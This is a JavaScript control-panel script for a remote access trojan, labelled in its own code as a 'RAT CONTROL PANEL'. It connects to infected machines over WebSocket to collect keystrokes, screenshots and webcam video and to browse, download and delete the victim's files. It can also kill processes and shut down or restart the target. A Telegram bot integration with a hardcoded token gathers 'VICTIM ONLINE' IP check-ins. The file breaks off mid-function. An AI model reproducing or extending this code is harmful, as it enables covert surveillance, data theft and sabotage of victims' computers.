let ws;
let sessionStartTime = null;
let commandCount = 0;
let dataSize = 0;
let keystrokeCount = 0;
let recordStartTime = null;
let sessionTimer = null;
let recordTimer = null;
let savedElapsedTime = 0;

// ============ TAB SWITCHING ============
function switchTab(tabId) {
    const sound = document.getElementById('sfx-menu');
    if (sound) {
        sound.currentTime = 0; // Tua lại từ đầu
        sound.volume = 0.6;    // Chỉnh âm lượng tùy ý
        sound.play().catch(e => {}); // Phát nhạc
    }
    // Hide all panels
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    
    // Remove active from menu
    document.querySelectorAll('.menu li').forEach(l => l.classList.remove('active'));
    
    // Show selected panel
    document.getElementById('tab-' + tabId).classList.add('active');
    
    // Highlight menu item
    if(event && event.currentTarget) {
        event.currentTarget.classList.add('active');
    }
    
    logConsole(`>> Switched to ${tabId.toUpperCase()} panel`);
}

// ============ CONNECTION ============
function connect() {
    const ip = document.getElementById('target-ip').value;
    const port = document.getElementById('target-port').value;
    // Lấy 2 nút bấm
    const btnLogin = document.getElementById('btn-conn');
    const loginStatus = document.getElementById('login-status');
    if (!ip || !port) {
        alert('Please enter IP and Port');
        return;
    }

    if(btnLogin) {
        btnLogin.disabled = true; // Khóa nút không cho bấm liên tục
        // Đổi màu nút sang màu xám hoặc giữ nguyên tùy ý
        btnLogin.style.opacity = "0.8";
    }
    let countdown = 3;
    const updateButtonText = () => {
        if(btnLogin) {
            btnLogin.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> INITIALIZING... (${countdown}s)`;
        }
        if(loginStatus) {
            loginStatus.innerText = "Encrypting handshake protocols...";
            loginStatus.style.color = "var(--primary)";
        }
    };
    updateButtonText();
    const timer = setInterval(() => {
        countdown--;
        if (countdown > 0) {
            updateButtonText();
        } else {
            clearInterval(timer); // Dừng đếm ngược
        }
    }, 1000);

    // 4. SAU 3 GIÂY MỚI THỰC SỰ KẾT NỐI
    setTimeout(() => {
        if(btnLogin) btnLogin.innerHTML = '<i class="fas fa-satellite-dish fa-pulse"></i> ESTABLISHING LINK...';
    try {
        ws = new WebSocket(`ws://${ip}:${port}`);
    } catch(e) { 
        alert("Invalid WebSocket Address");
        handleDisconnect("Invalid Address");resetConnectionUI(btn);
        return;
    }

    ws.onopen = () => {
        // --- KẾT NỐI THÀNH CÔNG ---
        const statusDot = document.getElementById('status-dot');
        const statusText = document.getElementById('status-text');
        if (statusDot) {
            statusDot.className = "status-indicator online"; // Thêm class 'online' để phát sáng
        }
        if (statusText) {
            statusText.innerText = "CONNECTED";
            statusText.style.color = "var(--primary)"; // Màu xanh
        }
        // 1. Cập nhật thông tin hiển thị bên trong App
        document.getElementById('display-ip').innerText = ip;
        document.getElementById('display-port').innerText = port;
        
        // 2. Chuyển màn hình: Ẩn Login -> Hiện Main App
        document.getElementById('login-screen').style.display = 'none';
        document.getElementById('main-app').style.display = 'flex';
        const btnDisconn = document.getElementById('btn-disconn');
        if (btnDisconn) {
            btnDisconn.disabled = false; // Cho phép bấm
            btnDisconn.style.opacity = "1"; // Sáng lên
            btnDisconn.style.cursor = "pointer"; // Hiện bàn tay
            
            // Nếu bạn dùng style "3 chấm" thì reset màu về đỏ (đề phòng bị kẹt màu xám)
            btnDisconn.style.backgroundColor = ""; 
        }
        // 3. Khởi động các bộ đếm
        sessionStartTime = Date.now();
        startSessionTimer();
        
        // Update dashboard
        document.getElementById('target-info').innerText = `${ip}:${port}`;
        
        logConsole(`╔═══════════════════════════════════════╗`);
        logConsole(`║  CONNECTION ESTABLISHED              ║`);
        logConsole(`╚═══════════════════════════════════════╝`);
        logConsole(`>> Target: ${ip}:${port}`);
        logConsole(`>> Status: ONLINE`);
        logConsole(`>> Time: ${new Date().toLocaleString()}`);
        logConsole(`>> Ready to receive commands...`);
    };

    ws.onclose = () => {
        statusText.innerText = "DISCONNECTED";
        statusText.style.color = "#555";
        statusDot.className = "status-indicator offline";
        
        resetConnectionUI(btn);
        stopSessionTimer();
        
        logConsole(`╔═══════════════════════════════════════╗`);
        logConsole(`║  CONNECTION LOST                     ║`);
        logConsole(`╚═══════════════════════════════════════╝`);
        logConsole(`>> Status: OFFLINE`);
        logConsole(`>> Session ended at ${new Date().toLocaleString()}`);
        
        alert("Connection Lost! The target may have disconnected.");
    };

    ws.onerror = (error) => {
        logConsole(`>> ERROR: Connection failed - ${error.message || 'Unknown error'}`);
        resetConnectionUI(btn);
    };

    ws.onmessage = (event) => {
        const data = event.data;
        dataSize += data.length;
        updateDataSize();
        if(data.startsWith("SYSINFO|")) {
            try {
                const info = JSON.parse(data.substring(8));
                if(info.error) {
                    logConsole(">> Error reading system specs: " + info.error);
                    return;
                }

                // Dùng hàm an toàn (SafeSetText) để tránh lỗi nếu thiếu ô nào đó
                safeSetText('sys-name', info.pcName);
                safeSetText('sys-user', "User: " + info.userName);
                safeSetText('sys-os', info.os);
                safeSetText('sys-uptime', info.uptime);
                safeSetText('sys-cpu', info.cpu);
                safeSetText('sys-ram', info.ram);
                safeSetText('sys-gpu', info.gpu);
                safeSetText('sys-disk', info.disk);

                document.title = `RAT: ${info.pcName}`;
                
                // Cập nhật cả Sidebar (nếu có)
                const targetInfo = document.getElementById('target-info');
                if(targetInfo) targetInfo.innerText = `${info.pcName}\n${info.userName}`;

                logConsole(`>> System Specs Received: ${info.pcName}`);
            } catch(e) {
                logConsole(`>> JS Error parsing info: ${e.message}`);
            }
        }
        // 1. XỬ LÝ INFO (Tên máy)
        else if(data.startsWith("INFO|")) {
            const parts = data.split('|');
            const pcName = parts[1];
            const userName = parts[2];

            // Cập nhật an toàn
            safeSetText('sys-name', pcName);
            safeSetText('sys-user', userName);

            // Phòng hờ giao diện cũ
            const targetInfo = document.getElementById('target-info');
            if(targetInfo) {
                targetInfo.innerHTML = `<div><strong>${pcName}</strong></div><small>${userName}</small>`;
            }
            document.title = `RAT: ${pcName}`;
        }
        // ... (Các if else cũ giữ nguyên) ...

        // --- XỬ LÝ FILE MANAGER ---
        else if (data.startsWith("FILE|")) {
            const parts = data.split('|');
            const action = parts[1]; // LIST hoặc DOWNLOAD

            if (action === "LIST") {
                // Cắt bỏ phần đầu "FILE|LIST|" để lấy dữ liệu thô
                const content = data.substring(10); 
                renderFileManager(content);
            }
            else if (action === "DOWNLOAD") {
                // Format: FILE|DOWNLOAD|Base64String
                const base64 = parts[2];
                // Tự đặt tên file là "downloaded_file" (Hoặc bạn có thể nâng cấp Server gửi kèm tên file)
                saveBase64File(base64, "downloaded_file.bin"); 
            }
        }
        // 2. XỬ LÝ WEBCAM
        else if(data.startsWith("CAM|")) {
            const camData = data.substring(4);
            const imgElement = document.getElementById('img-cam');
            const placeholder = document.getElementById('cam-placeholder');
            
            if(placeholder) placeholder.style.display = 'none';
            
            if(imgElement) {
                imgElement.style.display = 'block';
                imgElement.src = "data:image/jpeg;base64," + camData;
            }
            
            // Vẽ vào Canvas để quay phim (nếu đang quay)
            if (isRecording) {
                const canvas = document.getElementById('cam-canvas');
                if(canvas) {
                    const ctx = canvas.getContext('2d');
                    const image = new Image();
                    image.onload = function() {
                        ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
                    };
                    image.src = "data:image/jpeg;base64," + camData;
                }
            }
        }
    else if (data.startsWith("CAM_STOP")) {
        stopRecordingUI();
        logConsole(">> Recording finished.");}
        
        else if(data.startsWith("LOG|")) {
            const logMsg = data.substring(4);
            logConsole(logMsg);
            
            // Đếm phím an toàn
            if (!logMsg.startsWith(">>") && !logMsg.includes("Started") && !logMsg.includes("Paused")) {
                keystrokeCount += logMsg.length;
                safeSetText('keystroke-count', keystrokeCount);
            }
        }
        else if(data.startsWith("IMAGE|")) {
            const imgData = data.substring(6);
            const imgElement = document.getElementById('img-scr');
            const placeholder = document.getElementById('scr-placeholder');

            if(placeholder) placeholder.style.display = 'none';
            
            if(imgElement) {
                imgElement.style.display = 'block';
                imgElement.src = "data:image/jpeg;base64," + imgData;
            }
            logConsole(">> Screenshot received successfully");
        }

        // --- SỬA LOGIC XỬ LÝ PROCESS ---
else if(data.startsWith("PROCESS|")) {
    const rawData = data.substring(8); // Bỏ chữ "PROCESS|"
    const tbody = document.getElementById('process-table-body');
    
    if(tbody) {
        tbody.innerHTML = ""; // Xóa cũ
        
        // Giả sử dữ liệu gửi về dạng: "ProcessName (PID), ProcessName (PID), ..."
        // Tách chuỗi bằng dấu phẩy
        const processes = rawData.split(',');

        if (processes.length === 0 || (processes.length === 1 && processes[0] === "")) {
            tbody.innerHTML = '<tr><td colspan="2" class="text-center">No processes found</td></tr>';
        } else {
            processes.forEach(proc => {
                proc = proc.trim();
                if(!proc) return;

                // Cố gắng tách lấy số PID từ chuỗi (thường nằm trong ngoặc hoặc là số)
                // Ví dụ: "chrome.exe (1234)" -> lấy 1234
                let pid = "0";
                const match = proc.match(/\((\d+)\)/); // Tìm số trong ngoặc đơn
                if (match) {
                    pid = match[1];
                } else {
                    // Nếu không có ngoặc, thử tìm số cuối cùng
                    const numMatch = proc.match(/(\d+)$/);
                    if (numMatch) pid = numMatch[1];
                }

                // Tạo hàng trong bảng
                const tr = document.createElement('tr');
                tr.style.cursor = "pointer";
                
                // Khi click vào hàng -> Điền PID vào ô input
                tr.onclick = function() {
                    document.getElementById('proc-pid').value = pid;
                    // Highlight dòng đã chọn (Xóa active cũ, thêm active mới)
                    document.querySelectorAll('#process-table-body tr').forEach(r => r.style.background = "");
                    this.style.background = "rgba(0, 217, 255, 0.15)";
                };

                tr.innerHTML = `
                    <td><i class="fas fa-cog" style="color:#aaa; margin-right:10px"></i> ${proc}</td>
                    <td>
                        <button class="btn-mini btn-danger" onclick="killProcess('${pid}', event)">
                            Kill
                        </button>
                    </td>
                `;
                tbody.appendChild(tr);
            });
        }
    }
    logConsole(">> Process list updated");
}
        // --- TÌM VÀ THAY THẾ ĐOẠN APP| CŨ BẰNG ĐOẠN NÀY ---
        else if(data.startsWith("APP|")) {
            const parts = data.split('|');
            const type = parts[1];
            const contentIndex = data.indexOf('|', data.indexOf('|') + 1) + 1;
            const content = data.substring(contentIndex);

            if (type === 'LIST') {
                const tbody = document.getElementById('app-table-running');
                if(tbody) {
                    tbody.innerHTML = '';
                    if (!content || content.trim() === "") {
                        tbody.innerHTML = '<tr><td colspan="4" class="text-center">No apps found</td></tr>';
                    } else {
                        content.split('|||').forEach(app => {
                            if(!app) return;
                            const parts = app.split('§');
                            const pid = parts[0];
                            const name = parts[1];
                            const title = parts[2] || "";

                            if (pid) {
                                tbody.innerHTML += `
                                    <tr onclick="document.getElementById('app-pid').value='${pid}'" style="cursor:pointer">
                                        <td><span style="color:var(--accent)">${pid}</span></td>
                                        <td style="color:#fff; font-weight:500;">${name}</td>
                                        <td style="color:#aaa">${title}</td>
                                        <td class="text-center">
                                            <button class="btn-mini btn-danger" onclick="stopAppDirect('${pid}', event)" 
                                                    style="min-width: 80px; gap: 5px;">
                                                <i class="fas fa-stop"></i> STOP
                                            </button>
                                        </td>
                                    </tr>`;
                            }
                        });
                    }
                }
            }
    else if (type === 'INSTALLED') {
        const tbody = document.getElementById('app-table-installed');
        if(tbody) {
            tbody.innerHTML = '';
            if (!content || content.trim() === "") {
                tbody.innerHTML = '<tr><td colspan="2" class="text-center">No executable apps found</td></tr>';
            } else {
                content.split('|||').forEach(app => {
                    if(!app) return;
                    const parts = app.split('§');
                    const name = parts[0];
                    const path = parts[1];

                    if (name && path) {
                        // Escape dấu gạch chéo ngược
                        const safePath = path.replace(/\\/g, '\\\\');
                        tbody.innerHTML += `
                            <tr class="installed-app-row">
                                <td style="font-weight:500;">
                                    <i class="fas fa-cube" style="margin-right:10px; color:var(--text-dim)"></i>${name}
                                    <div style="font-size:10px; color:#555; margin-left:25px;">${path}</div>
                                </td>
                                <td>
                                    <button class="btn-mini btn-success" onclick="send('APP|START|${safePath}')">
                                        <i class="fas fa-play"></i> RUN
                                    </button>
                                </td>
                            </tr>`;
                    }
                });
                logConsole(`>> Library updated`);
            }
        }
    }
    // Đã xóa dòng processMessage(data); gây lỗi
}
    };
    },3000)
}


function formatList(items) {
    if (items.length === 0) return "No items found";
    return items.map((item, index) => {
        return `[${String(index + 1).padStart(3, '0')}] ${item}`;
    }).join('\n');
}

// ============ SEND COMMAND ============
function send(msg) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(msg);
        commandCount++;
        safeSetText('cmd-count', commandCount); // Fixed
        logConsole(`>> COMMAND SENT: ${msg}`);
        
        // Hook logic (keep existing logic here if you have it)
        if (msg === 'HOOK' && !recordStartTime) {
            recordStartTime = Date.now();
            startRecordTimer();
        } else if (msg === 'UNHOOK') {
            stopRecordTimer();
            recordStartTime = null;
        }
    } else {
        alert("System Offline! Please establish connection first.");
        logConsole(">> ERROR: Cannot send command - No active connection");
    }
}

// ============ MANAGE ACTIONS ============
function manage(type, action) {
    let id = "", val = "";
    
    if(type === 'PROCESS' && action === 'KILL') {
        id = 'proc-pid';
    } else if(type === 'APP' && action === 'KILL') {
        id = 'app-pid';
    } else if(type === 'APP' && action === 'START') {
        id = 'app-name';
    }
    
    val = document.getElementById(id).value.trim();
    
    if(val) {
        send(`${type}|${action}|${val}`);
        // Clear input after sending
        document.getElementById(id).value = '';
    } else {
        alert("Please enter required parameter");
        logConsole(`>> ERROR: Missing parameter for ${type}|${action}`);
    }
}

// ============ CONSOLE LOGGING ============
function logConsole(msg) {
    const consoleLog = document.getElementById('console-log');
    const keylogBox = document.getElementById('log-box');
    const timestamp = new Date().toLocaleTimeString();
    
    // Add to dashboard console
    consoleLog.value += `[${timestamp}] ${msg}\n`;
    consoleLog.scrollTop = consoleLog.scrollHeight;
    
    // If it's keylog data (not system messages), add to keylogger tab
    if (!msg.startsWith(">>") && !msg.startsWith("╔") && !msg.startsWith("║") && !msg.startsWith("╚")) {
        keylogBox.value += msg;
        keylogBox.scrollTop = keylogBox.scrollHeight;
    }
}

// ============ TIMERS ============
function startSessionTimer() {
    if (sessionTimer) clearInterval(sessionTimer);
    sessionTimer = setInterval(() => {
        if (sessionStartTime) {
            const s = Math.floor((Date.now() - sessionStartTime) / 1000);
            const timeString = new Date(s * 1000).toISOString().substr(11, 8);
            safeSetText('session-time', timeString);
        }
    }, 1000);
}

function stopSessionTimer() {
    if (sessionTimer) {
        clearInterval(sessionTimer);
        sessionTimer = null;
    }
    sessionStartTime = null;
}

// 1. Hàm Bắt đầu / Tiếp tục đếm giờ
function startRecordTimer() {
    if (recordTimer) clearInterval(recordTimer); // Tránh chạy trùng lặp
    
    // Tính toán thời điểm bắt đầu dựa trên thời gian đã lưu (để Resume)
    // Nếu là lần đầu, savedElapsedTime = 0 -> recordStartTime = Date.now()
    recordStartTime = Date.now() - savedElapsedTime;
    
    recordTimer = setInterval(() => {
        const elapsed = Date.now() - recordStartTime;
        document.getElementById('record-time').innerText = formatTime(elapsed);
    }, 1000);
}

// 2. Hàm Tạm dừng đếm giờ (Pause)
function stopRecordTimer() {
    if (recordTimer) {
        clearInterval(recordTimer);
        recordTimer = null;
        
        // Lưu lại khoảng thời gian đã chạy được
        if (recordStartTime) {
            savedElapsedTime = Date.now() - recordStartTime;
        }
    }
}

function formatTime(ms) {
    const seconds = Math.floor((ms / 1000) % 60);
    const minutes = Math.floor((ms / (1000 * 60)) % 60);
    const hours = Math.floor(ms / (1000 * 60 * 60));
    
    return `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
}

function updateDataSize() {
    safeSetText('data-size', (dataSize / 1024).toFixed(2) + " KB");
}

function updateKeystrokeCount() {
    document.getElementById('keystroke-count').innerText = keystrokeCount;
}

// ============ DANGER ZONE ============
function confirmShutdown() {
    const confirmed = confirm(
        '⚠️ CRITICAL WARNING ⚠️\n\n' +
        'You are about to SHUTDOWN the target system!\n\n' +
        'This action is IRREVERSIBLE and will immediately power off the remote machine.\n\n' +
        'Are you absolutely sure you want to proceed?'
    );
    
    if (confirmed) {
        const doubleConfirm = confirm(
            '⚠️ FINAL CONFIRMATION ⚠️\n\n' +
            'This is your last chance to cancel.\n\n' +
            'Click OK to SHUTDOWN the target system NOW.'
        );
        
        if (doubleConfirm) {
            send('SHUTDOWN');
            logConsole('╔═══════════════════════════════════════╗');
            logConsole('║  SHUTDOWN COMMAND EXECUTED           ║');
            logConsole('╚═══════════════════════════════════════╝');
            logConsole('>> Target system will shutdown in 5 seconds');
            logConsole('>> Connection will be lost');
            
            // Visual feedback
            const dangerBox = document.querySelector('.danger-box');
            dangerBox.style.animation = 'shake 0.5s ease infinite';
            
            setTimeout(() => {
                if (dangerBox) {
                    dangerBox.style.animation = '';
                }
            }, 5000);
        }
    }
}

function confirmReset() {
    const confirmed = confirm(
        '⚠️ SYSTEM RESTART WARNING ⚠️\n\n' +
        'You are about to RESTART the target system.\n\n' +
        'The connection will be lost temporarily until the machine boots up again.\n\n' +
        'Are you sure you want to proceed?'
    );
    
    if (confirmed) {
        send('RESET'); // Gửi lệnh RESET
        
        logConsole('╔═══════════════════════════════════════╗');
        logConsole('║  RESTART COMMAND EXECUTED            ║');
        logConsole('╚═══════════════════════════════════════╝');
        logConsole('>> Target system will reboot in 5 seconds');
        logConsole('>> Connection will be lost temporarily');
        
        // Hiệu ứng rung màn hình cảnh báo
        const dangerBox = document.querySelector('.danger-box');
        dangerBox.style.animation = 'shake 0.5s ease infinite';
        setTimeout(() => { if (dangerBox) dangerBox.style.animation = ''; }, 5000);
    }
}

// ============ KEYBOARD SHORTCUTS ============
document.addEventListener('keydown', (e) => {
    // Ctrl + Shift + C = Connect
    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
        e.preventDefault();
        connect();
    }
    
    // Ctrl + Shift + L = Clear console
    if (e.ctrlKey && e.shiftKey && e.key === 'L') {
        e.preventDefault();
        document.getElementById('console-log').value = '';
        logConsole('>> Console cleared');
    }
});

// ============ INITIALIZATION ============
window.addEventListener('load', () => {
    logConsole('╔═══════════════════════════════════════╗');
    logConsole('║  RAT CONTROL PANEL v2.0              ║');
    logConsole('╚═══════════════════════════════════════╝');
    logConsole('>> System initialized');
    logConsole('>> Waiting for connection...');
    logConsole('>> Tip: Use Ctrl+Shift+C to quick connect');
    logConsole('');
    
    // Initialize dashboard stats
    document.getElementById('target-info').innerText = "Awaiting Connection...";
    document.getElementById('session-time').innerText = "00:00:00";
    document.getElementById('cmd-count').innerText = "0";
    document.getElementById('data-size').innerText = "0 KB";
    document.getElementById('keystroke-count').innerText = "0";
    document.getElementById('record-time').innerText = "00:00:00";
});

// ============ AUTO-RECONNECT (Optional) ============
function enableAutoReconnect(ip, port, maxRetries = 3) {
    let retryCount = 0;
    
    const reconnect = () => {
        if (retryCount < maxRetries) {
            retryCount++;
            logConsole(`>> Auto-reconnect attempt ${retryCount}/${maxRetries}...`);
            setTimeout(() => {
                document.getElementById('target-ip').value = ip;
                document.getElementById('target-port').value = port;
                connect();
            }, 3000);
        } else {
            logConsole('>> Auto-reconnect failed after maximum retries');
        }
    };
    
    return reconnect;
}

// ============ EXPORT LOGS (Optional Enhancement) ============
function exportLogs() {
    const logs = document.getElementById('console-log').value;
    const blob = new Blob([logs], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `rat_logs_${Date.now()}.txt`;
    a.click();
    window.URL.revokeObjectURL(url);
    logConsole('>> Logs exported successfully');
}

// Hàm tìm kiếm trong danh sách Installed Apps
function filterApps() {
    const input = document.getElementById('search-app');
    const filter = input.value.toLowerCase();
    const rows = document.getElementsByClassName('installed-app-row');

    for (let i = 0; i < rows.length; i++) {
        const text = rows[i].textContent || rows[i].innerText;
        if (text.toLowerCase().indexOf(filter) > -1) {
            rows[i].style.display = "";
        } else {
            rows[i].style.display = "none";
        }
    }
}

let mediaRecorder;
let recordedChunks = [];
let isRecording = false;

function startRecording() {
    const duration = document.getElementById('cam-duration').value;
    const btn = document.getElementById('btn-record');
    
    // Gửi lệnh: CAM_STREAM | Số giây
    send(`CAM_STREAM|${duration}`);
    
    // Đổi giao diện nút bấm
    isRecording = true;
    btn.innerHTML = '<i class="fas fa-stop"></i> RECORDING...';
    btn.classList.add('pulse-animation'); // Bạn có thể thêm css animation nếu thích
    
    // Chuẩn bị Canvas để lưu video
    recordedChunks = [];
    const canvas = document.getElementById('cam-canvas');
    const img = document.getElementById('img-cam');
    
    // Đặt kích thước canvas bằng kích thước ảnh webcam (thường là 640x480)
    canvas.width = 640; 
    canvas.height = 480;
    
    // Tạo luồng stream từ canvas (25 FPS)
    const stream = canvas.captureStream(25); 
    
    try {
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    } catch (e) {
        mediaRecorder = new MediaRecorder(stream); // Fallback nếu không hỗ trợ mimeType chuẩn
    }

    mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
            recordedChunks.push(event.data);
        }
    };

    mediaRecorder.onstop = exportVideo;
    mediaRecorder.start();
    
    logConsole(`>> Started recording for ${duration} seconds...`);
}

function stopRecordingUI() {
    const btn = document.getElementById('btn-record');
    btn.innerHTML = '<i class="fas fa-circle"></i> REC';
    btn.classList.remove('pulse-animation');
    isRecording = false;
    
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
    }
}

function exportVideo() {
    const blob = new Blob(recordedChunks, { type: 'video/webm' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = url;
    a.download = `evidence_${Date.now()}.webm`;
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    logConsole(`>> Video saved successfully!`);
}

// --- DÁN CÁI NÀY XUỐNG CUỐI CÙNG FILE script.js ---
function safeSetText(id, text) {
    const el = document.getElementById(id);
    if (el) el.innerText = text;
}


// ============ MODULE FILE MANAGER ============
let currentPath = "";

// 1. Gửi yêu cầu lấy danh sách file
function requestFiles(path) {
    currentPath = path;
    document.getElementById('file-path').value = path;
    send("FILE|LIST|" + path);
    logConsole(">> Requesting files in: " + path);
    
    // Hiện loading trong lúc chờ
    document.getElementById('file-list-body').innerHTML = '<tr><td colspan="4" class="text-center">Loading...</td></tr>';
}

// 2. Làm mới thư mục hiện tại
function refreshFiles() {
    // Nếu chưa có đường dẫn nào, mặc định load ổ đĩa
    if (!currentPath || currentPath === "") {
        requestFiles("DRIVES");
    } else {
        requestFiles(currentPath);
    }
}

// 3. Lên 1 cấp thư mục (Back)
function goUp() {
    if (currentPath === "DRIVES" || currentPath.length <= 3) {
        requestFiles("DRIVES");
        return;
    }
    // Cắt bớt phần cuối đường dẫn (Ví dụ: C:\A\B -> C:\A)
    let newPath = currentPath.substring(0, currentPath.lastIndexOf('\\'));
    if(newPath.endsWith(":")) newPath += "\\"; // Fix lỗi ổ đĩa (C: -> C:\)
    requestFiles(newPath);
}

// 4. Xử lý dữ liệu từ Server gửi về (GỌI HÀM NÀY TRONG onmessage)
function renderFileManager(dataString) {
    const tbody = document.getElementById('file-list-body');
    
    // Kiểm tra xem bảng có tồn tại không để tránh lỗi null
    if (!tbody) {
        console.error("Lỗi: Không tìm thấy thẻ <tbody id='file-list-body'> trong HTML");
        return;
    }

    tbody.innerHTML = "";

    const items = dataString.split('|||'); // Tách các file

    if (items.length <= 1 && items[0] === "") {
        tbody.innerHTML = '<tr><td colspan="4" class="text-center">Empty Folder</td></tr>';
        return;
    }

    items.forEach(item => {
        if (!item || !item.trim()) return; // Bỏ qua dòng trống
        
        const parts = item.split('|'); // FOLDER|Name|Size
        const type = parts[0];
        const name = parts[1];
        const size = parts[2];

        const tr = document.createElement('tr');
        tr.style.cursor = "pointer";

        let icon = "";
        let actionHtml = "";
        let clickAction = "";

        // Escape dấu \ thành \\ để không bị lỗi cú pháp trong HTML onclick
        const safeName = name.replace(/\\/g, '\\\\'); 

        if (type === "DRIVE") {
            icon = '<i class="fas fa-hdd" style="color: gold;"></i>';
            // Dùng safeName thay vì name gốc
            clickAction = `requestFiles('${safeName}')`; 
        } 
        else if (type === "FOLDER") {
            icon = '<i class="fas fa-folder" style="color: #f1c40f;"></i>';
            
            // Logic ghép đường dẫn
            let nextPath = (currentPath === "DRIVES" || currentPath === "") 
                           ? name 
                           : (currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name);
            
            // Fix lỗi backslash kép cho JS
            let safePath = nextPath.replace(/\\/g, '\\\\'); 
            clickAction = `requestFiles('${safePath}')`;
        } 
        else if (type === "FILE") {
            icon = '<i class="fas fa-file" style="color: #ccc;"></i>';
            
            let fullPath = (currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name);
            let safeFullPath = fullPath.replace(/\\/g, '\\\\');
            
            // Click file -> Tải xuống
            clickAction = `downloadFile('${safeFullPath}', '${safeName}')`;
            
            // Nút xóa file
            actionHtml = `<button class="btn-mini btn-danger" onclick="deleteFile('${safeFullPath}', event)">Del</button>`;
        }

        tr.innerHTML = `
            <td onclick="${clickAction}" class="text-center">${icon}</td>
            <td onclick="${clickAction}">${name}</td>
            <td onclick="${clickAction}">${size}</td>
            <td class="text-center">${actionHtml}</td>
        `;
        tbody.appendChild(tr);
    });
}

// 5. Gửi lệnh tải file
function downloadFile(path, filename) {
    if(!confirm("Download " + filename + "?")) return;
    send("FILE|GET|" + path);
    logConsole(">> Requesting download: " + filename);
}

// 6. Gửi lệnh xóa file
function deleteFile(path, event) {
    event.stopPropagation(); // Chặn click nhầm vào dòng
    if(!confirm("DELETE PERMANENTLY: " + path + "?")) return;
    send("FILE|DEL|" + path);
    // Refresh lại list sau 1s
    setTimeout(refreshFiles, 1000);
}

// 7. Hàm hỗ trợ: Chuyển Base64 thành File để trình duyệt tải về
function saveBase64File(base64, filename) {
    try {
        // Chuyển Base64 -> Byte Array
        const byteCharacters = atob(base64);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        
        // Tạo Blob và Link tải giả
        const blob = new Blob([byteArray], {type: "application/octet-stream"});
        const link = document.createElement('a');
        link.href = window.URL.createObjectURL(blob);
        link.download = filename; // Tên file tải về
        link.click();
        
        logConsole(">> Download started: " + filename);
    } catch(e) {
        logConsole(">> Error saving file: " + e.message);
    }
}
// ============ TELEGRAM AUTO-FILL ============

async function fetchIpFromTelegram() {
    // 1. CẤU HÌNH (Điền Token Bot của bạn vào đây)
    const BOT_TOKEN = "8393288103:AAFyb7tZ1EVkzqwktDQdVSMHyeWKUM2flMI"; 
    
    const btn = event.currentTarget; // Lấy cái nút đang bấm
    const icon = btn.querySelector('i');
    
    // Hiệu ứng loading
    icon.className = "fas fa-spinner fa-spin";
    
    try {
        logConsole(">> Connecting to Telegram Bot API...");
        
        // 2. Gọi API lấy tin nhắn mới nhất
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=10&offset=-10`;
        const response = await fetch(url);
        const data = await response.json();
        
        if (!data.ok) throw new Error("Telegram API Error");

        // 3. Tìm tin nhắn báo danh gần nhất
        // Tin nhắn từ C# có dạng: "🚨 VICTIM ONLINE! ... Public IP: <code>123.456.78.9</code>"
        const messages = data.result.reverse(); // Đảo ngược để tìm tin mới nhất trước
        let foundIP = null;

        for (let msg of messages) {
            // Kiểm tra xem tin nhắn có chứa text không
            if (msg.message && msg.message.text) {
                const text = msg.message.text;
                
                // Chỉ tìm tin nhắn báo danh (có chữ Public IP)
                if (text.includes("Public IP") || text.includes("VICTIM ONLINE")) {
                    // Dùng Regex để bắt địa chỉ IP v4
                    const ipMatch = text.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
                    if (ipMatch) {
                        foundIP = ipMatch[0];
                        break; // Tìm thấy rồi thì dừng
                    }
                }
            }
        }

        // 4. Điền vào ô Input
        if (foundIP) {
            document.getElementById('target-ip').value = foundIP;
            logConsole(`>> Auto-filled IP from Telegram: ${foundIP}`);
            
            // Lưu luôn vào lịch sử (nếu bạn đã làm bước trước)
            if(typeof saveIpToHistory === "function") saveIpToHistory(foundIP);
            
            // Hiệu ứng thành công
            icon.className = "fas fa-check";
            icon.style.color = "lime";
        } else {
            logConsole(">> No Victim IP found in recent Telegram messages.");
            alert("Không tìm thấy IP nào trong 10 tin nhắn gần nhất!");
            icon.className = "fas fa-times";
            icon.style.color = "red";
        }

    } catch (e) {
        logConsole(`>> Error fetching Telegram: ${e.message}`);
        icon.className = "fas fa-exclamation-triangle";
        icon.style.color = "red";
    }

    // Reset icon sau 2 giây
    setTimeout(() => {
        icon.className = "fab fa-telegram";
        icon.style.color = "#0088cc";
    }, 2000);
}
// Hàm xử lý khi ngắt kết nối (Gọi chung)
function handleDisconnect(reason) {
    // 1. Đóng socket
    if (ws) { 
        ws.close(); 
        ws = null;
    }

    // 2. Reset giao diện về màn hình Login
    document.getElementById('main-app').style.display = 'none'; // Ẩn App
    document.getElementById('login-screen').style.display = 'flex'; // Hiện Login
    
    // 3. Reset nút Login
    const btnLogin = document.getElementById('btn-conn');
    const loginStatus = document.getElementById('login-status');
    if(btnLogin) {
        btnLogin.innerHTML = '<i class="fas fa-link"></i> ESTABLISH CONNECTION';
        btnLogin.disabled = false;
    }
    if(loginStatus) {
        loginStatus.innerText = reason ? "Error: " + reason : "Disconnected";
        loginStatus.style.color = "var(--danger)";
    }

    // 4. Dọn dẹp dữ liệu cũ
    stopSessionTimer();
    resetDashboard();
    
    logConsole(`>> DISCONNECTED (${reason})`);
}

// Hàm nút bấm Disconnect
function disconnect() {
    handleDisconnect("User Disconnected");
}

// Hàm trả nút bấm về trạng thái ban đầu
function resetConnectionUI() {
    const btnConn = document.getElementById('btn-conn');
